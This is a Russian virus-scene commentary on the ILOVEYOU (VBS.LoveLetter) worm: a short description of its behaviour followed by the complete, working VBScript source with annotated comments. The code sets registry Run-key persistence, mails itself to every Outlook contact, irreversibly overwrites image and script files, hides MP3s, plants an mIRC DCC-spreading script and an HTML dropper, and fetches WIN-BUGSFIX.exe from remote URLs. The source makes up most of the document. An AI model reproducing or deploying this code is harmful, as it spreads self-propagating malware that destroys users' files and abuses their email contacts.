               LOVE-LETTER-FOR-Y0U(ILOVEYOU  aka  LOVE-LETER)
                    комментарий  by ULTRAS[MATRiX]

   Этот  вирус  всего  за несколько часов в течение 4 мая с.г. этот новый
Интернет-червь посетил компьютеры тысячи пользователей во всем мире.

 Описание вируса "VBS.LoveLetter"
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   Вирус  VBS.LoveLetter  представляет  собой  командный  файл  (скрипт),
написанный  на языке VBS (Visual Basic Script) и способный рассылать свои
копии  по электронной почте и через IRC. Основной канал распространения -
электронная почта.

   Вирус  рассылает  свои  копии  в  виде  сообщений  электронной  почты.
Характерные признаки генерируемых вирусом писем следующие:
   - Поле темы письма (subject): "ILOVEYOU";
   -  Текст  в  теле письма: "kindly check the attached LOVELETTER coming
from me";
   - Присоединенный к письму файл: "LOVE-LETTER-FOR-YOU.TXT.vbs".

   Вирус  не может самостоятельно активизироваться при просмотре письма в
почтовом  клиенте,  но  ряд  моментов провоцирует пользователя-получателя
открыть   присоединенный  к  письму  файл,  и,  тем  самым,  активировать
содержащийся  там  вирус. Тема письма "ILOVEYOU" уже привлекает внимание.
Поскольку   вирус   рассылает  себя  по  адресам,  которые  он  находит в
адресной  книге  инфицированного  компьютера,  в  поле адреса отправителя
письма зачастую оказывается адрес какого-нибудь хорошего знакомого. Кроме
того,  при  стандартных  настройках Windows (не показывать расширения для
зарегистрированных типов файлов) расширение ".vbs" вирусного модуля может
не   отображаться  почтовым  клиентом,  и  вложенный  в  письмо  вирусный
VBS-скрипт   будет   показан  просто  как  безобидный  на  первый  взгляд
"LOVE-LETTER-FOR-YOU.TXT".

   При  открытии этого присоединенного к письму файла вирус активируется.
При этом он:

   1) Создает свои копии в системном и основном каталоге Windows:
   -   в  системный  каталог  вирус  записывает  две  копии  под  именами
"MSKernel32.vbs" и "LOVE-LETTER-FOR-YOU.TXT.vbs", соответственно;
   - в основной каталог Windows - одну, под именем "Win32DLL.vbs".

 Кроме того, регистрируется автозапуск вируса при старте Windows:
  - запуск "MSKernel32.vbs" прописывается в ключе реестра:
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32;
  - запуск Win32DLL.vbs прописывается в ключе реестра:
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL

   2) Рассылает свои копии по электронной почте, используя _все_ почтовые
адреса  из  местной адресной книги MS Outlook. Рассылка, разумеется, идет
от имени пользователя данной системы.

   3)  Проверяет  наличие  в  системном  каталоге  Windows  некоего файла
WINFAT32.EXE  и,  в  случае обнаружения такового, предпринимает ряд шагов
для:
   - загрузки с некоторого адреса в Internet файла "WIN-BUGSFIX.EXE";
   - запуска этого файла "WIN-BUGSFIX.EXE".

   (Смысл  этих  действий  пока  не  ясен,  т.к.  на данный момент нам не
удалось  обнаружить  ни  одного образца WIN-BUGSFIX.EXE. Во всяком случае
все  четыре  заложенные  в вирусе адреса Internet для его загрузки уже не
существуют).

   4)   Вирус   сканирует  все  доступные  на  компьютере-жертве  диски и
записывает свои копии во все файлы с расширениями ".jpg", ".jpeg", ".js",
".css",  ".vbs",  ".vbe",  ".jse",  ".wsh", ".sct" и ".hta". Оригинальное
содержание  таких  файлов необратимо затирается вирусным кодом. Все такие
файлы   кроме  того  переименовываются,  получая  расширение  ".vbs"  (за
исключением  тех, которые имели расширение ".vbs" или ".vbe" изначально).
Кроме  этого,  вирус  ищет  файлы  с  расширениями ".mp2" и ".mp3", но не
затирает их, а создает файлы с
   такими  же  именами,  но с расширениями ".vbs", записывает в эти файлы
свой код, а оригинальным файлам ставит атрибут "hidden" (скрытый).

   5) Вирус создает в системном каталоге Windows так называемый "дроппер"
(инсталлятор      вируса)      в      формате     HTML     под     именем
"LOVE-LETTER-FOR-YOU.HTM"   и  затем  пытается  обнаружить  установленный
клиент  для  IRC  (конкретно  говоря  -  популярный пакет mIRC). В случае
успеха   вирус   создает   конфигурационный   файл   SCRIPT.INI,  который
настраивает  mIRC  на  автоматическую  рассылку "LOVE-LETTER-FOR-YOU.HTM"
пользователям  тех  каналов IRC, к которым попытается подключиться данная
инфицированная   система.   Открытие   файла  "LOVE-LETTER-FOR-YOU.HTM" в
броузере  приводит к установке копии вирусного скрипта "MSKERNEL32.VBS" в
систему.

   Описание взято с drweb.ru

   Tnx Duke, RoadKill за бин. этого вируса


-( Вирус ) ------------------------------------------------------------------------------------------

rem  barok -loveletter(vbe) <i hate go to school>
rem                     by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
' копирайты
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
' это понадобиться в вирусе
vbscopy=file.ReadAll
' прочитаем весь активный файл(вирус)
main()
' запустить главную процедуру
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
' получим путь к каталогу Windows
Set dirsystem = fso.GetSpecialFolder(1)
' получим путь к каталогу System
Set dirtemp = fso.GetSpecialFolder(2)
' получим путь к каталогу Temp
Set c = fso.GetFile(WScript.ScriptFullName)
' получим имя активного файла
c.Copy(dirsystem&"\MSKernel32.vbs")
' копируем в системный каталог копию вируса
c.Copy(dirwin&"\Win32DLL.vbs")
' копируем в виндовый каталог копию вируса
c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
' копируем в системный каталог второю копию вируса
regruns()
' запустим процедуру связанную с реестром
html()
' запустим процедуру html документа
spreadtoemail()
' запустим процедуру распространение по мылу
listadriv()
' запустим процедуру деструкций
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
' создаем ключ который при запуске системы будет запускать вирус
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
' проверим Download Directory
if (downread="") then
downread="c:\"
' укажем что теперь Download Directory на диске C:\
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
' проверим если такой файл в системной дире
Randomize
num = Int((4 * Rnd) + 1)
' генерим число от 1 до 4
if num = 1 then
' если 1 то запишем ключ
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
' который будет запускать стартовую стараничку с выше указанного адреса
elseif num = 2 then
' если 1 то запишем ключ
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
' который будет запускать стартовую стараничку с выше указанного адреса
elseif num = 3 then
' если 1 то запишем ключ
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
' который будет запускать стартовую стараничку с выше указанного адреса
elseif num = 4 then
' если 1 то запишем ключ
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
' который будет запускать стартовую стараничку с выше указанного адреса
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
' проверим если у нас имеется файл WIN-BUGSFIX.exe
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
' при запуске системы запустим выше указанный файл
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
' деструктивная процедура
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
' поиск на всех дисках
end sub
sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
' проверим если файлы ^^^^
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
' запишем себя место них
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
' проверим если файлы ^^^^
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
' запишем себя место них
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
' проверим если файлы ^^^^
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
' запишем себя место них
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
' если есть мирк файлы в дире
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
' то создадим скрипт для дальнейшего распространнения
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next
end sub
sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next
end sub
sub regcreate(regkey,regvalue)
' процедура создания ключа в реестр
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
' процедура чтения ключа в реестр
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
' процедура посылки писем
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
'откроем Outlook
set mapi=out.GetNameSpace("MAPI")
'проверим использует электронную почту вирус
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "ILOVEYOU"
male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
'засуним в месаг наш вирус
male.Send
' посылаем письмо
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
' процедура html странички
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub